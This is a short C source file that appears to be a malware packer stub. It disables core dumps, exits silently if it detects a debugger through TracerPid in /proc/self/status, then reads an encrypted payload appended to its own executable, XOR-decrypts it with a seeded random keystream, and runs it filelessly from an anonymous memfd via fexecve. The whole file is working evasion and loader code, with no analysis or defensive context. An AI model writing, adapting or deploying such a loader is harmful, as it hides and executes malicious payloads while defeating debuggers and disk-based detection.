#define _GNU_SOURCE

#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <signal.h>
#include <sys/prctl.h>

int main(int argc, char **argv) {
	
	prctl(PR_SET_DUMPABLE, 0);
	FILE* proc_status = fopen("/proc/self/status", "r");
	if (proc_status == NULL) {
		exit(0);
	}
	char line[1024] = { };
	char *fgets(char *s, int size, FILE *stream);
	while (fgets(line, sizeof(line), proc_status) != NULL) {
		const char traceString[] = "TracerPid:";
		char* tracer = strstr(line, traceString);
		if (tracer != NULL) {
			int pid = atoi(tracer + sizeof(traceString) - 1);
			if (pid != 0) {
				fclose(proc_status);
				exit(0);
			}
		}
	}
	fclose(proc_status);
	
	int OFFSET = 0x704f6666;
	int payloadLen;
	int payloadFd;

	char *filePath = realpath("/proc/self/exe", NULL);

    FILE *file;
	char *buffer;
	unsigned long fileLen;

    unsigned char *payload;
	int key = 0x6b657931;

	srand(key);

	file = fopen(filePath, "rb");
	fseek(file, 0, SEEK_END);
	fileLen = ftell(file);
	payloadLen = fileLen - OFFSET;
	fseek(file, 0, SEEK_SET);
	buffer = malloc(fileLen + 1);
	fread(buffer, fileLen, 1, file);
	fclose(file);

    payload = malloc(payloadLen);

	memcpy(payload, buffer + OFFSET, payloadLen);

	for (int i = 0; i < payloadLen; i++) {
        payload[i] = payload[i] ^ random() % 256;
	}

	payloadFd = memfd_create("", 0);
	write(payloadFd, payload, payloadLen);

    char *payloadEnv[] = { NULL };
    fexecve(payloadFd, argv , payloadEnv);
	close(payloadFd);
}